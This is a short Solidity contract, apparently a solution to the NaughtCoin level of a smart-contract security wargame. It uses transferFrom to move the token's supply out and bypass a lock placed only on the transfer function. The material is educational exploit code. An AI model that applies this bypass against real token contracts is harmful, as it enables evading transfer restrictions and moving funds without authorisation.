contract NaughtCoinAttack {
    NaughtCoin target;
    
    constructor(address _target) public {
        target = NaughtCoin(_target);
    }
    
    function attack() public {
        target.transferFrom(msg.sender, address(this), target.totalSupply());
    }

}